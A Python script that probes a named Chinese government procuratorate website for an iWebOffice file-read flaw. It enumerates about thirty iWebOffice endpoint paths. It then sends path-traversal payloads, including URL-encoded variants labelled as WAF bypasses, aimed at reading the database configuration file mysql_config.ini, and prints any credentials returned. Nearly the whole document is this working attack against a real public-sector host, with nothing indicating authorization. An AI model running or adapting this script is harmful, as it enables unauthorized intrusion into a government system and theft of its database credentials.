import subprocess
import time
import urllib.parse

TARGET = "http://www.chengyang.qdjcy.gov.cn"
UA = "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"

def curl_test(path, label, timeout=15):
    url = TARGET + path
    cmd = [
        "curl", "-s", "-i",
        "-A", UA,
        "--compressed",
        "--max-time", str(timeout),
        url
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        output = result.stdout
        
        if "\r\n\r\n" in output:
            headers_part, body = output.split("\r\n\r\n", 1)
        elif "\n\n" in output:
            headers_part, body = output.split("\n\n", 1)
        else:
            headers_part = output
            body = ""
        
        first_line = headers_part.split("\n")[0] if headers_part else ""
        status = first_line.split(" ")[1] if len(first_line.split(" ")) > 1 else "?"
        
        content_type = ""
        for line in headers_part.split("\n"):
            if line.lower().startswith("content-type:"):
                content_type = line.split(":", 1)[1].strip()
        
        print(f"  [{status}] {len(body):6d}字节  {label}")
        if content_type:
            print(f"         Content-Type: {content_type}")
        
        return status, body, headers_part, url
    except Exception as e:
        print(f"  [ERROR] {e} - {label}")
        return "ERROR", "", "", url

def main():
    print("=" * 70)
    print("  iWebOffice 漏洞验证 - 城阳区人民检察院")
    print("=" * 70)

    print("\n[1] 基线测试")
    print("-" * 50)
    curl_test("/", "首页")
    curl_test("/404test_nonexistent", "不存在的页面(404基准)")

    print("\n[2] iweboffice 路径探测")
    print("-" * 50)
    paths = [
        "/iweboffice/",
        "/iweboffice/officeserver.php",
        "/iweboffice/OfficeServer.php",
        "/iweboffice/office.php",
        "/iweboffice/iwebOffice.php",
        "/iweboffice/webofc.php",
        "/iweboffice/ReadFile.php",
        "/iweboffice/DownFile.php",
        "/iweboffice/UploadFile.php",
        "/iweboffice/FileDown.php",
        "/iweboffice/FileUp.php",
        "/iweboffice/SaveFile.php",
        "/iweboffice/LoadFile.php",
        "/iweboffice/OfficeServer",
        "/iweboffice/officeserver",
        "/iWebOffice/",
        "/iWebOffice/officeserver.php",
        "/iWebOffice2015/",
        "/iWebOffice2015/officeserver.php",
        "/iWebOffice2015/OfficeServer.php",
        "/office/",
        "/office/officeserver.php",
        "/weboffice/",
        "/weboffice/officeserver.php",
        "/plugins/iweboffice/officeserver.php",
        "/include/iweboffice/officeserver.php",
        "/static/iweboffice/officeserver.php",
        "/statics/iweboffice/officeserver.php",
        "/Public/iweboffice/officeserver.php",
        "/upload/iweboffice/officeserver.php",
    ]
    for p in paths:
        curl_test(p, p)
        time.sleep(0.2)

    print("\n[3] 如果找到officeserver.php，测试路径穿越")
    print("-" * 50)
    
    # 先尝试用URL编码绕过WAF，直接测试原始payload
    print("  尝试URL编码绕过WAF的路径穿越:")
    encoded_payloads = [
        ("%2e%2e/mysql_config.ini", "URL编码 ../mysql_config.ini"),
        ("..%2fmysql_config.ini", "..%2f (编码/)"),
        ("%2e%2e%2fmysql_config.ini", "全URL编码"),
        ("..\\mysql_config.ini", "反斜杠路径"),
        ("....//mysql_config.ini", "双重编码绕过"),
        ("..././mysql_config.ini", "..././绕过"),
    ]
    
    for payload, label in encoded_payloads:
        url_path = f"/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME={payload}"
        status, body, headers, full_url = curl_test(url_path, label, timeout=10)
        if status == "200" and len(body) > 0 and "404" not in body[:200]:
            print(f"    !! 可能存在文件读取漏洞!")
            print(f"       响应前500字符: {body[:500]}")
        time.sleep(0.3)

    print("\n[4] 测试其他常见PHP文件读取点")
    print("-" * 50)
    other_payloads = [
        ("/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=mysql_config.ini", "同目录mysql_config.ini"),
        ("/iweboffice/OfficeServer.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini", "OfficeServer.php 路径穿越"),
        ("/iweboffice/ReadFile.php?file=../mysql_config.ini", "ReadFile.php 路径穿越"),
        ("/iweboffice/DownFile.php?file=../mysql_config.ini", "DownFile.php 路径穿越"),
        ("/iweboffice/FileDown.php?FileName=../mysql_config.ini", "FileDown.php 路径穿越"),
        ("/iweboffice/FileDown.php?filepath=../mysql_config.ini", "FileDown.php filepath"),
    ]
    for path, label in other_payloads:
        status, body, headers, full_url = curl_test(path, label, timeout=10)
        if status == "200" and len(body) > 0 and "404" not in body[:200] and "数据库" in body or "mysql" in body.lower() or "password" in body.lower() or "host" in body.lower():
            print(f"    !! 可能读取到敏感文件!")
            print(f"       响应前500字符: {body[:500]}")
        time.sleep(0.3)

    print("\n[5] 在首页HTML中搜索iweboffice引用")
    print("-" * 50)
    status, body, headers, _ = curl_test("/", "首页内容搜索")
    if "iweboffice" in body.lower() or "iweboffice" in body:
        print("  !! 在首页中发现iweboffice引用!")
        for line in body.split("\n"):
            if "iweb" in line.lower() and len(line.strip()) < 300:
                print(f"     {line.strip()[:200]}")
    else:
        print("  - 首页中未发现iweboffice引用")
    
    # 搜索其他可能的文件读取参数
    if "officeserver" in body.lower() or "loadfile" in body.lower():
        print("  !! 在首页中发现officeserver/loadfile引用!")

    print("\n验证完成。")

if __name__ == "__main__":
    main()
